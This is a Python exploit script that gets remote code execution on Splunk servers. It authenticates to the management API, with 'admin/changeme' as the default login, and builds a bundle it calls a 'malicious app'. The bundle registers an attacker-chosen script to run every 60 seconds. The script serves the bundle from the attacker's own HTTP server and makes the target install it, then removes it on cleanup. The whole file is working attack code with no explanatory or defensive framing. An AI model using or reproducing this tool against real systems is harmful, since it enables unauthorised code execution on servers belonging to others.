import sys, os, tempfile, shutil
import tarfile
import requests
import socketserver
from http.server import SimpleHTTPRequestHandler
import argparse
import threading

requests.packages.urllib3.disable_warnings(category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

SPLUNK_APP_NAME = '_PWN_APP_'


def create_splunk_bundle(options):
    tmp_path = tempfile.mkdtemp()
    os.mkdir(os.path.join(tmp_path, SPLUNK_APP_NAME))

    bin_dir = os.path.join(tmp_path, SPLUNK_APP_NAME, "bin")
    os.mkdir(bin_dir)
    pwn_file = os.path.join(bin_dir, options.payload_file)
    open(pwn_file, "w").write(options.payload)
    # make the script executable - not 100% certain this makes a difference
    os.chmod(pwn_file, 0o700)

    local_dir = os.path.join(tmp_path, SPLUNK_APP_NAME, "local")
    os.mkdir(local_dir)
    inputs_conf = os.path.join(local_dir, "inputs.conf")
    with open(inputs_conf, "w") as f:
        inputs = '[script://$SPLUNK_HOME/etc/apps/{}/bin/{}]\n'.format(SPLUNK_APP_NAME, options.payload_file)
        inputs += 'disabled = false\n'
        inputs += 'index = default\n'
        inputs += 'interval = 60.0\n'
        inputs += 'sourcetype = test\n'
        f.write(inputs)

    (fd, tmp_bundle) = tempfile.mkstemp(suffix='.tar')
    os.close(fd)
    with tarfile.TarFile(tmp_bundle, mode="w") as tf:
        tf.add(os.path.join(tmp_path, SPLUNK_APP_NAME), arcname=SPLUNK_APP_NAME)

    shutil.rmtree(tmp_path)
    return tmp_bundle


class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        global BUNDLE_FILE
        bundle = open(BUNDLE_FILE, 'rb').read()

        self.send_response(200)
        self.send_header('Expires', 'Thu, 26 Oct 1978 00:00:00 GMT')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Content-type', 'application/tar')
        self.send_header('Content-Disposition', 'attachment; filename="splunk_bundle.tar"')
        self.send_header('Content-Length', len(bundle))
        self.end_headers()

        self.wfile.write(bundle)


class ThreadedHTTPServer(object):
    """Runs SimpleHTTPServer in a thread
    Lets you start and stop an instance of SimpleHTTPServer.
    """

    def __init__(self, host, port, request_handler=SimpleHTTPRequestHandler):
        """Prepare thread and socket server
        Creates the socket server that will use the HTTP request handler. Also
        prepares the thread to run the serve_forever method of the socket
        server as a daemon once it is started
        """
        socketserver.TCPServer.allow_reuse_address = True
        self.server = socketserver.TCPServer((host, int(port)), request_handler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()

    def stop(self):
        """Stop the HTTP server
        Stops the server and cleans up the port assigned to the socket
        """
        self.server.shutdown()
        self.server.server_close()


parser = argparse.ArgumentParser()
parser.add_argument('--scheme', default="https")
parser.add_argument('--host', required=True)
parser.add_argument('--port', default=8089)
parser.add_argument('--lhost', required=True)
parser.add_argument('--lport', default=8181)
parser.add_argument('--username', default="admin")
parser.add_argument('--password', default="changeme")
parser.add_argument('--payload', default="calc.exe")
parser.add_argument('--payload-file', default="pwn.bat")
options = parser.parse_args()

print("Running in remote mode (Remote Code Execution)")

SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )

s = requests.Session()
s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
s.verify = False

print("[.] Authenticating...")
req = s.get(SPLUNK_BASE_API)
if req.status_code == 401:
    print("Authentication failure")
    print("")
    print(req.text)
    sys.exit(-1)
print("[+] Authenticated")

print("[.] Creating malicious app bundle...")
BUNDLE_FILE = create_splunk_bundle(options)
print("[+] Created malicious app bundle in: " + BUNDLE_FILE)

httpd = ThreadedHTTPServer(options.lhost, options.lport, request_handler=CustomHandler)
print("[+] Started HTTP server for remote mode")

lurl = "http://{}:{}/".format(options.lhost, options.lport)

print("[.] Installing app from: " + lurl)
req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
if req.status_code != 200 and req.status_code != 201:
    print("Got a problem: " + str(req.status_code))
    print("")
    print(req.text)
print("[+] App installed, your code should be running now!")

print("\nPress RETURN to cleanup")
input()
os.remove(BUNDLE_FILE)

print("[.] Removing app...")
req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
if req.status_code != 200 and req.status_code != 201:
    print("Got a problem: " + str(req.status_code))
    print("")
    print(req.text)
print("[+] App removed")

httpd.stop()
print("[+] Stopped HTTP server")

print("Bye!")
